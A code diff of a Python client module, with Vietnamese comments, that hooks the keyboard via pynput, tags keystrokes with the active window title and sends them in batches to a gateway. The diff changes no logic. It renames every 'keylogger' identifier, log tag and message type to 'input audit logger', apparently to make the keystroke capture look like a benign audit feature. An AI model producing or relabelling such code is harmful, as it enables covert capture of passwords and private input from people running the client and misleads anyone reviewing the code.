@@ -1,6 +1,6 @@
 """
 ===============================================================================
-FILE: client-app/modules/keylogger.py
+FILE: client-app/modules/input_audit_logger.py
 PURPOSE: Ghi nhật ký thao tác bàn phím (Input Audit Log) phục vụ kiểm toán hệ thống.
 ARCHITECTURE ROLE:
   - Hardware Hooking Module (sử dụng `pynput`).
@@ -17,7 +17,7 @@ import time
 from typing import Callable, List, Dict, Any, Optional
 from pynput import keyboard
 
-logger = logging.getLogger("KeyloggerModule")
+logger = logging.getLogger("InputAuditModule")
 
 _user32 = ctypes.windll.user32
 
@@ -27,7 +27,7 @@ FLUSH_MAX_BUFFER = 50
 
 
 def _get_active_window_title() -> str:
-    """Lấy tiêu đề cửa sổ đang được focus (để đính kèm vào keylogger.data)."""
+    """Lấy tiêu đề cửa sổ đang được focus (để đính kèm vào input_audit.data)."""
     try:
         hwnd = _user32.GetForegroundWindow()
         length = _user32.GetWindowTextLengthW(hwnd)
@@ -40,7 +40,7 @@ def _get_active_window_title() -> str:
         return ""
 
 
-class KeyloggerService:
+class InputAuditLogger:
     """
     Class quản lý dịch vụ Hook Bàn phím và Buffer lưu trữ dữ liệu phím.
     """
@@ -60,10 +60,10 @@ class KeyloggerService:
 
         Args:
             on_flush_callback: Hàm nhận (entries, window_title) để gửi về Gateway
-                                dưới dạng message keylogger.data.
+                                dưới dạng message input_audit.data.
         """
         if self.is_logging:
-            logger.warning("⚠️ Keylogger đã đang trong trạng thái hoạt động!")
+            logger.warning("⚠️ Input Audit Logger đã đang trong trạng thái hoạt động!")
             return
 
         self.is_logging = True
@@ -78,7 +78,7 @@ class KeyloggerService:
         self._flush_thread = threading.Thread(target=self._periodic_flush_loop, daemon=True)
         self._flush_thread.start()
 
-        logger.info("⌨️ [KEYLOGGER] Đã bật dịch vụ Ghi nhật ký bàn phím (Input Audit Log).")
+        logger.info("⌨️ [INPUT AUDIT] Đã bật dịch vụ Ghi nhật ký bàn phím (Input Audit Log).")
 
     def stop_logging(self):
         """
@@ -96,7 +96,7 @@ class KeyloggerService:
 
         # Xả nốt dữ liệu còn sót lại trong Buffer
         self.flush_buffer()
-        logger.info("🛑 [KEYLOGGER] Đã dừng dịch vụ Ghi nhật ký bàn phím.")
+        logger.info("🛑 [INPUT AUDIT] Đã dừng dịch vụ Ghi nhật ký bàn phím.")
 
     def _on_key_press(self, key):
         """
@@ -158,7 +158,7 @@ class KeyloggerService:
             try:
                 self._on_flush_callback(entries_to_send, window_title)
             except Exception as e:
-                logger.error(f"❌ Lỗi gửi dữ liệu Keylogger qua callback: {str(e)}")
+                logger.error(f"❌ Lỗi gửi dữ liệu Input Audit Log qua callback: {str(e)}")
 
 
-keylogger_service = KeyloggerService()
+input_audit_logger = InputAuditLogger()
